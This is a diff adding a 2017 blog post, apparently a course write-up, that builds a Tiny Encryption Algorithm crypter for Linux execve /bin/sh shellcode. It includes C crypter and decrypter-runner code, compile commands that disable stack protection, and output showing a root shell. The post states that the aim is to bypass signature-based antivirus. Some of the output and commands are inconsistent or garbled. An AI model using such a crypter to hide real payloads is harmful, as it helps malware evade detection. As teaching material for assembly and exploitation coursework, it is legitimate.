@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      SLAE Assignment 7 - Custom crypter &middot; Lanyon
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/certification/2017/04/30/slae-shellcode-crypter/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>A reserved <a href="https://jekyllrb.com" target="_blank">Jekyll</a> theme that places the utmost gravity on content with a hidden drawer. Made by <a href="https://twitter.com/mdo" target="_blank">@mdo</a>.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+
+    
+
+    
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+          <a class="sidebar-nav-item" href="http://localhost:4000/about/">About</a>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+
+    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
+    <a class="sidebar-nav-item" href="">GitHub project</a>
+    <span class="sidebar-nav-item">Currently v1.1.0</span>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2020. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Lanyon</a>
+            <small>A Jekyll theme</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">SLAE Assignment 7 - Custom crypter</h1>
+  <span class="post-date">30 Apr 2017</span>
+  <p><br />
+Student <strong>SLAE - 891</strong><br />
+Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
+<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+
+<h2 id="assignment-7">Assignment 7:</h2>
+
+<p><strong>Our Goal:</strong></p>
+<blockquote>
+  <p><em>Create a custom crypter</em></p>
+  <ul>
+    <li><em>Free to use any existing encryption schema</em></li>
+    <li><em>Can use any programming language</em></li>
+  </ul>
+</blockquote>
+
+<p>Hello everybody,</p>
+
+<p>In this last assignment we will aim at creating a shellcode crypter. The crypter program will cipher our shellcode in order to defeat any reverse-engineering analysis and to bypass fingerprint/signature based anti-virus detection.</p>
+
+<p>A quick search for a simple encryption algorithm leads to the <a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm">Tiny Encryption Algorithm</a>:<br />
+<em>‘In cryptography, the Tiny Encryption Algorithm (TEA) is a block cipher notable for its simplicity of description and implementation, typically a few lines of code.’</em></p>
+
+<p><img src="http://localhost:4000/public/images/slae/assignment7/image.png" alt="image" /></p>
+
+<p>If you want to read more about the Tiny Encryption Algorithm and its implementation and weaknesses nowadays, here is a <a href="http://www.tayloredge.com/reference/Mathematics/TEA-XTEA.pdf">link</a>.</p>
+
+<p>For this assignment we will use the <a href="https://github.com/phackt/slae/tree/master/assignment7/execve-stack.nasm">execve-stack.nasm</a> shellcode:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+</code></pre></div></div>
+
+<p>Now let’s create our C crypter <a href="https://github.com/phackt/slae/tree/master/assignment7/tea_crypter.c">tea_crypter.c</a>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">encode</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">y</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">z</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+	<span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">delta</span> <span class="o">=</span> <span class="mh">0x9e3779b9</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">sum</span> <span class="o">+=</span> <span class="n">delta</span><span class="p">;</span>
+		<span class="n">y</span> <span class="o">+=</span> <span class="p">(</span><span class="n">z</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">^</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">^</span><span class="p">(</span><span class="n">z</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+		<span class="n">z</span> <span class="o">+=</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">^</span><span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">^</span><span class="p">(</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+	<span class="p">}</span>
+	<span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span>
+	<span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">z</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">decode</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="n">sum</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">z</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+	<span class="n">delta</span><span class="o">=</span><span class="mh">0x9e3779b9</span><span class="p">;</span>
+	<span class="n">sum</span> <span class="o">=</span> <span class="n">delta</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	     	<span class="n">z</span> <span class="o">-=</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">^</span><span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">^</span><span class="p">(</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> 
+	     	<span class="n">y</span> <span class="o">-=</span> <span class="p">(</span><span class="n">z</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">^</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">^</span><span class="p">(</span><span class="n">z</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+	     	<span class="n">sum</span> <span class="o">-=</span> <span class="n">delta</span><span class="p">;</span>  
+	<span class="p">}</span>
+	<span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span> 
+	<span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">z</span><span class="p">;</span>  
+<span class="p">}</span>
+
+<span class="cm">/* Character Array Functions */</span>
+<span class="kt">void</span> <span class="nf">codestr</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">datastr</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">keystr</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">datasize</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">datastr</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">keystr</span><span class="p">;</span>
+	<span class="n">datasize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">datastr</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">);</span>
+	<span class="n">datasize</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="n">datasize</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">datasize</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+		<span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">datastr</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">decodestr</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">datastr</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">keystr</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">datasize</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">datastr</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">keystr</span><span class="p">;</span>
+	<span class="n">datasize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">datastr</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">);</span>
+	<span class="n">datasize</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="n">datasize</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">datasize</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+		<span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">datastr</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
+	<span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span> <span class="c1">//execve-stack</span>
+	
+	<span class="kt">int</span> <span class="n">last</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">"iloveshellcodess"</span><span class="p">;</span>
+	
+	<span class="n">str</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">;</span>
+
+	<span class="n">codestr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"\Ciphered shellcode size: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"\Ciphered shellcode:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">str</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+	<span class="p">}</span>
+	
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s compile and run our TEA crypter:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o tea_crypter tea_crypter.c &amp;&amp; chmod u+x ./tea_crypter &amp;&amp; ./tea_crypter</span>
+Ciphered shellcode size: 25
+Ciphered shellcode:
+<span class="se">\x</span>75<span class="se">\x</span>ac<span class="se">\x</span>f4<span class="se">\x</span>4c<span class="se">\x</span>4f<span class="se">\x</span>97<span class="se">\x</span>9a<span class="se">\x</span>0a<span class="se">\x</span>92<span class="se">\x</span>b5<span class="se">\x</span>29<span class="se">\x</span>5f<span class="se">\x</span>9e<span class="se">\x</span>a3<span class="se">\x</span>a0<span class="se">\x</span>53<span class="se">\x</span>a7<span class="se">\x</span>a9<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>3c<span class="se">\x</span>6f<span class="se">\x</span>85<span class="se">\x</span>ee<span class="se">\x</span>95<span class="se">\x</span>80
+</code></pre></div></div>
+
+<p>Now let’s decrypt and execute this shellcode (<a href="https://github.com/phackt/slae/tree/master/assignment7/tea_decrypter.c">tea_decrypter.c</a>):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">decode</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="n">sum</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">z</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+	<span class="n">delta</span><span class="o">=</span><span class="mh">0x9e3779b9</span><span class="p">;</span>
+	<span class="n">sum</span> <span class="o">=</span> <span class="n">delta</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	     	<span class="n">z</span> <span class="o">-=</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">^</span><span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">^</span><span class="p">(</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> 
+	     	<span class="n">y</span> <span class="o">-=</span> <span class="p">(</span><span class="n">z</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">^</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">^</span><span class="p">(</span><span class="n">z</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+	     	<span class="n">sum</span> <span class="o">-=</span> <span class="n">delta</span><span class="p">;</span>  
+	<span class="p">}</span>
+	<span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span> 
+	<span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">z</span><span class="p">;</span>  
+<span class="p">}</span>
+
+<span class="cm">/* Character Array Functions */</span>
+<span class="kt">void</span> <span class="nf">decodestr</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">datastr</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">keystr</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">datasize</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">datastr</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">keystr</span><span class="p">;</span>
+	<span class="n">datasize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">datastr</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">);</span>
+	<span class="n">datasize</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="n">datasize</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">datasize</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+		<span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">datastr</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
+	<span class="s">"</span><span class="se">\x75\xac\xf4\x4c\x4f\x97\x9a\x0a\x92\xb5\x29\x5f\x9e\xa3\xa0\x53\xa7\xa9\xcd\x3c\x6f\x85\xee\x95\x80</span><span class="s">"</span><span class="p">;</span>	
+
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">"iloveshellcodess"</span><span class="p">;</span>
+	
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">);</span>
+	<span class="n">decodestr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+	
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Decrypted shellcode:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// we are executing the shellcode once it has been decrypted</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Running shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buffer</span><span class="p">;</span>
+	<span class="n">ret</span><span class="p">();</span>
+	
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Then:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o tea_crypter tea_crypter.c &amp;&amp; chmod u+x ./tegcc -fno-stack-protector -z execstack -o tea_decrypter tea_decrypter.c &amp;&amp; chmod u+x ./tea_decrypter &amp;&amp; ./tea_decrypter</span>
+Decrypted shellcode:
+<span class="se">\x</span>75<span class="se">\x</span>ac<span class="se">\x</span>f4<span class="se">\x</span>4c<span class="se">\x</span>4f<span class="se">\x</span>97<span class="se">\x</span>9a<span class="se">\x</span>0a<span class="se">\x</span>92<span class="se">\x</span>b5<span class="se">\x</span>29<span class="se">\x</span>5f<span class="se">\x</span>9e<span class="se">\x</span>a3<span class="se">\x</span>a0<span class="se">\x</span>53<span class="se">\x</span>a7<span class="se">\x</span>a9<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>3c<span class="se">\x</span>6f<span class="se">\x</span>85<span class="se">\x</span>ee<span class="se">\x</span>95<span class="se">\x</span>80
+Running shellcode...
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># </span>
+</code></pre></div></div>
+
+<p>Perfect, so our shellcode has been well decrypted and executed. Remember that TEA has some weaknesses, you may use another algorithm if you need strong encryption (AES, RSA, Blowfish, Twofish, …).  Also avoid simple XOR encryption because the xoring key can be guessed thanks to a tool like <a href="https://github.com/hellman/xortool">xortool</a>.</p>
+
+<p>So it was our last assignment for the exam of the  <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>  course.<br />
+Thanks again to Vivek and its team for their work.</p>
+
+<p>Hope to see you soon,</p>
+
+<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/dev/2020/05/27/git-secrets-exposed/">
+            What solutions to prevent git leaks ?
+            <small>27 May 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web/2018/08/05/web-exposed-git-repositories/">
+            Gathering some information from web exposed git repositories
+            <small>05 Aug 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web/2017/12/24/play-with-permissive-cors/">
+            Play with permissive CORS
+            <small>24 Dec 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+
+    <!-- <label for="sidebar-checkbox" class="sidebar-toggle"></label> -->
+
+    <script src='/public/js/script.js'></script>
+ 
+  </body>
+</html>
